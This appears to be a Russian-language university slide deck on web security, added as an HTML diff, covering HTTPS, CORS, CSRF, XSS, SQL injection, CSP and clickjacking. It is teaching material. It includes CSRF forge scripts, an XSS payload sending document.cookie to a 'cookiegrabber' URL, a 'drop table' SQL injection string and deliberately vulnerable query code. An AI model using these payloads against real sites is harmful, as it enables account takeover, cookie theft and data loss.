@@ -1,0 +1,628 @@
+<!doctype html>
+<html lang="ru">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<title>Веб-безопасность</title>
+
+		<link rel="stylesheet" href="/utils/dist/reset.css">
+		<link rel="stylesheet" href="/utils/dist/reveal.css">
+		<link rel="stylesheet" href="/utils/dist/theme/white.css" id="theme">
+		<link rel="stylesheet" href="/utils/css/custom.css">
+		<link rel="stylesheet" href="/utils/plugin/plugin/highlight/equilibrium-light.css">
+
+		<script src="/utils/js/metrika.js"></script>
+	</head>
+	<body>
+		<div class="reveal">
+			<div class="slides">
+				<section data-background-image="/utils/assets/background.webp">
+					<h2>Безопасность</h2>
+				</section>
+
+				<section>
+					<h3>HTTP/HTTPS</h3>
+				</section>
+
+				<section>
+					<p>
+						HTTP (HyperText Transfer Protocol) - «протокол передачи гипертекста» (то есть документов, которые могут содержать ссылки, позволяющие организовать переход к другим документам)
+					</p>
+				</section>
+
+				<section>
+					<p>Любой HTTP запрос преодолевает длинный путь через множество промежуточных узлов</p>
+					<div class="fragment">
+						<p>Как может выглядеть путь:</p>
+						<ul>
+							<li>сеть вуза</li>
+							<li>сеть интернет-провайдера</li>
+							<li>различные промежуточные сети</li>
+							<li>запрашиваемый ресурс</li>
+						</ul>
+					</div>
+				</section>
+
+				<section data-background-image="/utils/assets/web-security/submarinecablemap.png">
+					<!--					<h3>HTTP/HTTPS</h3>-->
+				</section>
+
+				<section>
+					<p>HTTP передаёт информацию между браузером и сервером в чистом тексте, позволяя видеть эту информацию в сети, через которую она проходит</p>
+				</section>
+
+				<section>
+					<h3>HTTPS (HyperText Transfer Protocol Secure)</h3>
+
+					<p>Протокол HTTPS используетcя поверх протокола TLS (Transport Layer Security)</p>
+					<p>TLS гибридная криптографическая система (использует несколько криптографических подходов - асимметрическое шифрование и симметричное шифрование)</p>
+				</section>
+
+				<section>
+					<p>Ассиметрическое шифрование используется для получения секретного ключа (один на сессию), а дальше все запросы шифруются и дешифруются с помощью этого секретного ключа</p>
+				</section>
+
+				<section>
+					<p>Решили ли мы вопрос с безопаностью?</p>
+					<p class="fragment">Нет т.к. установка зашифрованного канала общения не говорит о том, с кем установлен канал общения</p>
+				</section>
+
+				<section>
+					<p>Сертификаты</p>
+					<q class="fragment">В самом грубом приближении, цифровой сертификат – это файл, использующий электроннуй-цифровую подпись.</q>
+					<br>
+					<br>
+					<q class="fragment">Цифровая подпись на сертификате означает, что некто удостоверяет тот факт, что данный открытый ключ принадлежит определенному лицу или организации.</q>
+					<br>
+					<p class="fragment">Сертификаты связывают доменные имена с определенным публичным ключом</p>
+				</section>
+
+				<section>
+					<p>Чтобы сертификату доверял любой веб-браузер, он должен быть подписан аккредитованным удостоверяющим центром (центром сертификации, Certificate Authority, CA)</p>
+				</section>
+
+				<section>
+					<p>Как установить сертификат на свой сайт?</p>
+					<p>Шаг 1. Покупаем домен</p>
+					<p>Шаг 2. Получаем сертификат с помощью некоммерческого центра сертификации <a href="https://letsencrypt.org/">letsencrypt</a></p>
+					<p>(бесплатно на 90 дней с бесконечной возможностью продления)</p>
+				</section>
+
+				<section>
+					<h3>Same-origin policy (SOP)</h3>
+					<p class="fragment">Политика "одинакового источника" ограничивает доступ окон и фреймов друг к другу</p>
+				</section>
+
+				<section>
+					<p>Политика "одинакового источника"</p>
+					<p>Источники одинаковые если у них одинаковые 3 параметра</p>
+					<ul>
+						<li>протокол</li>
+						<li>домен</li>
+						<li>порт</li>
+					</ul>
+				</section>
+
+				<section>
+					<p>Играем в игру "Одинаковый ли источник?"</p>
+
+					<ol style="font-size: 30px">
+						<li class="fragment">
+							<div>http://ya-itmo.ru</div>
+							<div>http://ya-itmo.ru:80</div>
+						</li>
+						<li class="fragment">
+							<div>http://ya-itmo.ru</div>
+							<div>http://ya-itmo.ru/main</div>
+						</li>
+						<li class="fragment">
+							<div>http://ya-itmo.ru</div>
+							<div>http://www.ya-itmo.ru</div>
+						</li>
+						<li class="fragment">
+							<div>http://ya-itmo.ru/page1</div>
+							<div>https://ya-itmo.ru/page2</div>
+						</li>
+						<li class="fragment">
+							<div>http://ya-itmo.ru</div>
+							<div>http://ya-itmo.ru:8000</div>
+						</li>
+						<li class="fragment">
+							<div>http://team1.ya-itmo.ru</div>
+							<div>http://ya-itmo.ru</div>
+						</li>
+					</ol>
+				</section>
+
+				<section>
+					<p>Как быть с вложенными поддоменами?</p>
+					<code>http://team1.ya-itmo.ru</code><br>
+					<code>http://ya-itmo.ru</code>
+
+					<br>
+					<br>
+
+					<pre class="fragment">
+						<code data-trim data-line-numbers=''>
+							document.domain = 'ya-itmo.ru';
+						</code>
+					</pre>
+				</section>
+
+				<section>
+					<h3>Cross-Origin Resource Sharing (CORS)</h3>
+
+					<ul>
+						<li class="fragment"><code>No ‘Access-Control-Allow-Origin’ header is present on the requested resource.</code></li>
+						<li class="fragment"><code>Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://example.com/</code></li>
+						<li class="fragment"><code>Access to fetch at ‘https://example.com’ from origin ‘http://localhost:3000’ has been blocked by CORS policy.</code></li>
+					</ul>
+				</section>
+
+				<section>
+					<p>Представим ситуацию</p>
+					<p>С сайта <code>team10.ya-itmo.ru</code> нужно запросить данные от <code>team11.ya-itmo.ru/api</code></p>
+
+					<p class="fragment">Что делать?</p>
+				</section>
+
+				<section>
+					<p>Есть 2 вида запросов на другой источник</p>
+					<ul>
+						<li>Простой</li>
+						<li>Непростой</li>
+					</ul>
+				</section>
+
+				<section>
+					<p>Простые запросы удовлетворяет 2 условиям</p>
+					<ul>
+						<li class="fragment">используют методы GET, POST или HEAD</li>
+						<li class="fragment">используют простые заголовки
+							<ul>
+								<li>Accept</li>
+								<li>Accept-Language</li>
+								<li>Content-Language</li>
+								<li>Content-Type со значением:
+									<ul>
+										<li>application/x-www-form-urlencoded</li>
+										<li>multipart/form-data</li>
+										<li>text/plain</li>
+									</ul>
+								</li>
+							</ul>
+						</li>
+					</ul>
+				</section>
+
+				<section>
+					<p>Если происходит простой запрос на другой источник, то ответ запроса блокируется браузером (нет предзапроса)</p>
+					<p>Если происходит непростой запрос на другой источник, то браузер сначала отправит предзапрос (preflight)</p>
+				</section>
+
+				<section>
+					<p>Что из себя представляет предзапрос</p>
+					<p>Это запрос, который использует метод OPTIONS, нету тела запроса и есть 3 заголовка</p>
+					<ul>
+						<li class="fragment">Origin - источник (протокол/домен/порт)</li>
+						<li class="fragment">Access-Control-Request-Method - HTTP метод непростого запроса</li>
+						<li class="fragment">Access-Control-Request-Headers - список разделенный запятыми непростых заголовков</li>
+					</ul>
+				</section>
+
+				<section>
+					<p>Если такой запрос разрешено принимать, сервер должен ответить без тела, статусом 200 и заголовками</p>
+					<ul>
+						<li class="fragment">Access-Control-Allow-Origin - разрешённый источник</li>
+						<li class="fragment">Access-Control-Allow-Methods - разрешённые методы</li>
+						<li class="fragment">Access-Control-Allow-Headers - разрешённые заголовки</li>
+						<li class="fragment">(опциональный) Access-Control-Max-Age - время кеширования разрешения</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>Cross-Site Request Forgery (CSRF)</h3>
+					<p>(Подделка межсайтовых запросов)</p>
+				</section>
+
+				<section>
+					<h3>Рассмотрим ситуацию</h3>
+					<pre>
+						<code data-trim data-line-numbers=''>
+							// мы на странице https://team10.ya-itmo.ru/, где добавлена форма:
+
+							&lt;form action="https://team11.ya-itmo.ru/api/login" method="POST"&gt;
+								&lt;input type="hidden" name="login" value="itmo"&gt;
+								&lt;input type="submit" value="Отправить"&gt;
+							&lt;/form&gt;
+						</code>
+					</pre>
+
+					<form action="https://team11.ya-itmo.ru/api/mail" method="POST">
+						<input type="hidden" name="mail" value="itmo@mail.ru">
+						<input type="submit" value="Отправить">
+					</form>
+
+					<p class="fragment">Что происходит с точки зрения сервиса https://team11.ya-itmo.ru?</p>
+				</section>
+
+				<section>
+					<p>Атака использовала слабое звено авторизации - куки позволяют определить, что пришел определенный пользователь, но ничего не говорит об отправляемых данных</p>
+					<p>(куки отправляются автоматически с запросом)</p>
+				</section>
+
+				<section>
+					<p>Игра на внимательность #1</p>
+					<pre class="fragment">
+						<code data-trim data-line-numbers=''>
+							&lt;script&gt;
+								fetch('https://team11.ya-itmo.ru/api/mail', {
+									method: 'POST',
+									// Обеспечивает отправку куки,
+									// ассоциированных с team11.ya-itmo.ru
+									credentials: 'include',
+									headers: {
+										'Content-Type': 'application/json'
+									},
+									// Новый email, который злоумышленник пытается установить
+									body: JSON.stringify({ email: 'itmo@mail.ru' })
+								});
+							&lt;/script&gt;
+						</code>
+					</pre>
+					<p class="fragment">упс, помешает CORS</p>
+				</section>
+
+				<section>
+					<p>Игра на внимательность #2</p>
+					<pre class="fragment">
+						<code data-trim data-line-numbers=''>
+							&lt;script&gt;
+								fetch('https://team11.ya-itmo.ru/api/mail', {
+									method: 'POST',
+									credentials: 'include',
+									headers: {
+										'Content-Type': 'application/x-www-form-urlencoded'
+									},
+									body: 'email=itmo@mail.ru'
+								});
+							&lt;/script&gt;
+						</code>
+					</pre>
+					<p class="fragment">Сейчас CORS помешает?</p>
+					<p class="fragment">Не помешает - браузер заблокирует ответ, но запрос будет отправлен и принят другой стороной</p>
+				</section>
+
+				<section>
+					<h3>Как защититься от CSRF?</h3>
+					<ul>
+						<li>CSRF token</li>
+						<li>Double submit cookie</li>
+						<li>Content-Type based protection</li>
+						<li>Referer-based protection</li>
+						<li>Password confirmation</li>
+						<li>
+							<p>SameSite Cookies</p>
+							<code class="fragment" style="font-size: 24px">Set-Cookie: session=value; path=/; SameSite</code>
+							<br>
+							<code class="fragment" style="font-size: 24px">SameSite=Strict (куки не отправляются)</code>
+							<br>
+							<code class="fragment" style="font-size: 24px">SameSite=Lax (куки отправляются, когда используются безопасные HTTP методы - GET, HEAD, OPTIONS, TRACE)</code>
+						</li>
+					</ul>
+				</section>
+
+				<section>
+					<h3>Насколько серьезны CSRF-уязвимости?</h3>
+					<ul>
+						<li>Account takeover — атакующий захватывает аккаунт жертвы путем смены email</li>
+						<li>Privilege Escalation — повышение привилегий за счет того, что атакующий через CSRF создает нового пользователя с высокими правами в системе</li>
+						<li>Remote code execution — выполнение кода за счет эксплуатации command injection в админке через CSRF</li>
+					</ul>
+				</section>
+
+				<section>
+					<p>Может быть такие атаки устарели?</p>
+
+					<p class="fragment">Увы нет, на 2021 год CSRF занимает 10е место в <a href="https://owasp.org/www-project-top-ten/">топе уязвимостей (OWASP)</a></p>
+				</section>
+
+				<section>
+					<h3>OWASP <br>(Open Web Application Security Project) </h3>
+					<p>OWASP Top 10 Project - проект, который начинался как задумка энтузиастов, а стал самым авторитетным источником классификации векторов атак и уязвимостей веб приложений.</p>
+				</section>
+
+				<section>
+					<h3>HTML Injection &<br> Cross-Site Scripting (XSS)</h3>
+					<p style="font-size: 24px">(Injection - топ 3 по OWASP в 2021, топ 1 в 2017)</p>
+					<p class="fragment">HTML Injection - внедрение HTML кода на страницу</p>
+					<p class="fragment">XSS - внедрение вредоносного скрипта</p>
+				</section>
+
+				<section>
+					<h3>HTML Injection</h3>
+
+					<p>Основные виды:</p>
+					<ul>
+						<li>Stored HTML Injection <span class="fragment"> - вредоносный код сохраняется на сервере и выполняется у всех</span></li>
+						<li>Reflected HTML Injection <span class="fragment"> - внедрение происходит, когда веб-сайт немедленно реагирует на злонамеренный ввод</span></li>
+					</ul>
+
+					<div class="fragment">
+						<input style="width:220px" id="input_1" value="строка поиска">
+						<button onclick="function getvalue() {const el = document.getElementById('input_1'); const div = document.getElementById('div_1'); div.innerHTML += el.value + '<br>'}; getvalue()">submit</button>
+					</div>
+					<br>
+					<div id="div_1">
+
+					</div>
+				</section>
+
+				<section>
+					<h3>Cross-Site Scripting (XSS)</h3>
+
+					<p class="fragment">Пример</p>
+					<pre class="fragment">
+						<code data-trim data-line-numbers=''>
+							&lt;script&gt;
+								document.location=
+									'https://team10.ya-itmo.ru/cookiegrabber?c='+document.cookie
+							&lt;/script&gt;
+						</code>
+					</pre>
+				</section>
+
+				<section>
+					<h3>SQL Injection</h3>
+
+					<pre class="fragment">
+						<code data-trim data-line-numbers=''>
+							const db = require('./database');
+							const express = require('express');
+							const app = express();
+
+							app.get('/api/user', (req, res) => {
+								const sql = `SELECT * FROM users WHERE username = '${req.query.username}'`;
+
+								return db.get(sql);
+							});
+						</code>
+					</pre>
+
+					<p class="fragment">https://team10.ya-itmo.ru/api/user?username=totoro</p>
+					<p class="fragment">https://team10.ya-itmo.ru/api/user?username=totoro'; drop table users-- </p>
+				</section>
+
+				<section>
+					<p>Решение - параметризованные параметры</p>
+
+					<pre>
+						<code data-trim data-line-numbers=''>
+							const sql = 'SELECT * FROM users WHERE username = ?'
+							const result = await db.get(sql, 'test')
+						</code>
+					</pre>
+					<a hre="https://www.npmjs.com/package/sqlite#getting-a-single-row">Ссылка на документацию по sqlite с параметризованными запросами</a>
+				</section>
+
+				<section>
+					<p>Общие рекомендации по защите от HTML инъекциям/XSS</p>
+					<ul>
+						<li>Экранировать в пользовательском вводе спец символы (&lt;, &gt;, &amp;, ", '), например, с помощь библиотеки lodash, функции <a href="https://lodash.com/docs/4.17.15#escape">escape</a></li>
+						<li>Санитизация - очистка html от неразрешенных тегов, атрибутов, например с помощью библиотеки <a href="https://www.npmjs.com/package/dompurify">DOMPurify</a></li>
+					</ul>
+				</section>
+
+				<section>
+					<p>Хорошие новости</p>
+					<p>В React по умолчанию экранируется пользовательский ввод</p>
+					<pre>
+						<code data-trim data-line-numbers=''>
+							const App = () => {
+								const data = 'lorem <b>ipsum</b>';
+
+								return (
+									&lt;body&gt;
+										&lt;div&gt;{data}&lt;/div&gt;
+										&lt;div dangerouslySetInnerHTML={{__html: data}}/&gt;
+									&lt;/body&gt;
+
+								);
+							}
+						</code>
+					</pre>
+				</section>
+
+				<section>
+					<h3>Слайд, посвященный второму хакатону</h3>
+					<p>Генерировать html по markdown на клиенте - плохо</p>
+				</section>
+
+				<section>
+					<p>Можно ли обезопасить себя даже на случай, если злоумышленник все-таки сможет добавить вредоностный код на страницу?</p>
+				</section>
+
+				<section>
+					<h3>Content Security Policy (CSP)</h3>
+					<p>Политика описывает безопасные источники загрузки ресурсов, устанавливает правила использования встроенных стилей, скриптов</p>
+				</section>
+
+				<section>
+					<p>Страница должна содержать заголовок <code>Content-Security-Policy</code> <br>c 1 или более директив</p>
+					<br>
+					<div class="fragment">
+						<p>Базовый вид:</p>
+						<code style="font-size: 32px">Content-Security-Policy: script-src &lt;source&gt; &lt;source&gt; &lt;source&gt;;</code>
+					</div>
+					<p class="fragment">где &lt;source&gt; домен или ключевое слово, например: 'self' или 'unsafe-inline'</p>
+				</section>
+
+				<section>
+					<p>Примеры директив:</p>
+					<ul>
+						<li>default-src</li>
+						<li>script-src</li>
+						<li>style-src</li>
+						<li>img-src</li>
+						<li>media-src</li>
+						<li>frame-src</li>
+						<li>font-src</li>
+					</ul>
+					<p><code>default-src</code> применяется для всех неуказанных директив</p>
+				</section>
+
+				<section>
+					<p>Еще пример</p>
+
+					<code style="font-size: 32px">Content-Security-Policy:
+						<br>
+						script-src 'self' storage.yandexcloud.net;
+						<br>
+						style-src 'self' storage.yandexcloud.net;
+						<br>
+						report-uri: https://team10.ya-itmo.ru/csp/report;
+					</code>
+
+					<p class="fragment">report-uri - адрес, куда браузер автоматически отправит запрос, если сработала CSP</p>
+				</section>
+
+				<section>
+					<p>Включение политики CSP на уже рабочем сервисе потенциально опасное изменение</p>
+					<br>
+					<p class="fragment">Как быть уверенным, что наша политика CSP ничего не нарушит?</p>
+					<p class="fragment">Меняем заголовок Content-Security-Policy на Content-Security-Policy<span style="color: limegreen">-Report-Only</span></p>
+				</section>
+
+				<section>
+					<p>Что делать, если мы хотим добавить свои inline скрипты/стили, но заблокировать чужие (добавленные злоумышленником)?</p>
+					<p class="fragment">Мы не должны указывать в директивах script-src и style-src значения 'unsafe-inline'</p>
+
+					<pre>
+						<code data-trim data-line-numbers=''>
+							// не inline скрипт
+							&lt;script src="/js/main.js"&gt;&lt;/script&gt;
+
+							// inline скрипт
+							&lt;script&gt;
+								// наша полезная логика
+							&lt;/script&gt;
+						</code>
+					</pre>
+				</section>
+
+				<section>
+					<p>Есть 2 способа, как это сделать</p>
+					<ul>
+						<li>sha (хеш содержимого скрипта)</li>
+						<li>nonce (атрибут у тега)</li>
+					</ul>
+
+					<pre class="fragment">
+						<code data-trim data-line-numbers=''>
+							// Указываем хеш содержимого скрипта
+							Content-Security-Policy: script-src 'self' 'sha256-V8ghUBat8RY1nqMBeNQlXGceJ4GMuwYA55n3cYBxxvs=';
+
+							// inline скрипт
+							&lt;script&gt;
+								// наша полезная логика
+							&lt;/script&gt;
+							// браузер сам вычислит хеш inline скрипта и проверит, есть ли такое значение в заголовке
+						</code>
+					</pre>
+
+					<pre class="fragment">
+						<code data-trim data-line-numbers=''>
+							// Указываем хеш содержимого скрипта
+							Content-Security-Policy: script-src 'self' 'nonce-randomText';
+
+							// inline скрипт
+							&lt;script nonce="randomText"&gt;
+								// наша полезная логика
+							&lt;/script&gt;
+						</code>
+					</pre>
+				</section>
+
+				<section>
+					<p><a href="https://helmetjs.github.io/">Helmet JS</a> инструмент для сервера, увеличивающий безопасность т.к. проставляет ряд заголовков, уменьшающие векторы атаки</p>
+				</section>
+
+				<section>
+					<h3>Clickjacking</h3>
+					<p>Атака, позволяет вредоносной странице кликнуть по сайту-жертве от имени посетителя</p>
+					<br>
+					<p>Как устроена на практике</p>
+					<ul>
+						<li>Посетитель оказывается на вредоносной страницы</li>
+						<li>Кликает по кнопке</li>
+						<li>Поверх этой ссылки вредоносная страница размещает прозрачный iframe с src другого сайта</li>
+						<li>При попытке клика на эту ссылку посетитель на самом деле нажимает на кнопку</li>
+					</ul>
+				</section>
+
+				<section>
+					<p>Примеры защиты от Clickjacking</p>
+					<ul>
+						<li>Выставить заголовок на страницу X-Frame-Options и с помощью него запретить открытие вашего сервиса в iframe</li>
+						<li>Выставить атрибут cookie: samesite</li>
+					</ul>
+				</section>
+
+				<section>
+					<p>Еще одна отсылка к хакатону</p>
+					<br>
+					<p>Любые изменения данных на сервере не должны происходить простым запросом (методы: GET, HEAD, OPTIONS, TRACE)</p>
+					<p>Иначе, например, если добавить картинку в сервис вида &lt;img src="/auth/logout"&gt;, пользователь будет разлогинен</p>
+				</section>
+
+				<section>
+					<h3>Рассылки. Бонусный раздел</h3>
+
+					<p class="fragment">Предположим, что у нас есть почта: <code>email@domain.com</code></p>
+					<p class="fragment">Тогда при регистрации на любом из ресурсов указываем не <br> <code>email@domain.com</code>, а <br> <code>email<b>+&lt;любой текст&gt;</b>@domain.com</code></p>
+					<p class="fragment">Пример: <code>email+google@domain.com</code></p>
+					<p class="fragment">Теперь в рекламной рассылке можно увидеть почту, куда высылалось сообщение</p>
+				</section>
+
+				<section>
+					<p>И теперь у вас есть при одной почте бесчисленное количество адресов</p>
+				</section>
+
+				<section>
+					<p>Полезные ссылки</p>
+					<ul>
+						<li><a href="https://www.submarinecablemap.com/">Карта подводных кабелей интернета</a></li>
+						<li><a href="https://habr.com/ru/articles/493402/">Habr статья о том, как провайдер добавлял рекламу на сайт</a></li>
+						<li><a href="https://habr.com/ru/articles/188042/">Как HTTPS обеспечивает безопасность соединения</a></li>
+						<li><a href="https://habr.com/ru/companies/macloud/articles/553826/">CORS</a></li>
+						<li><a href="https://learn.javascript.ru/csrf">CRFS</a></li>
+						<li><a href="https://habr.com/ru/companies/oleg-bunin/articles/412855/">Актуальность CSRF</a></li>
+						<li><a href="https://learn.javascript.ru/cross-window-communication">Same Origin Policy</a></li>
+						<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a></li>
+						<li><a href="https://owasp.org/www-project-top-ten/">Топ 10 уязвимостей по OWASP</a></li>
+						<li><a href="https://learn.javascript.ru/clickjacking">Clickjacking</a></li>
+					</ul>
+
+				</section>
+			</div>
+		</div>
+
+		<script src="/utils/dist/reveal.js"></script>
+		<script src="/utils/plugin/plugin/notes/notes.js"></script>
+		<script src="/utils/plugin/plugin/markdown/markdown.js"></script>
+		<script src="/utils/plugin/plugin/highlight/highlight.js"></script>
+		<script>
+			// More info about initialization & config:
+			// - https://revealjs.com/initialization/
+			// - https://revealjs.com/config/
+			Reveal.initialize({
+				hash: true,
+				slideNumber: true,
+
+				// Learn about plugins: https://revealjs.com/plugins/
+				plugins: [ RevealMarkdown, RevealHighlight, RevealNotes ]
+			});
+		</script>
+	</body>
+</html>
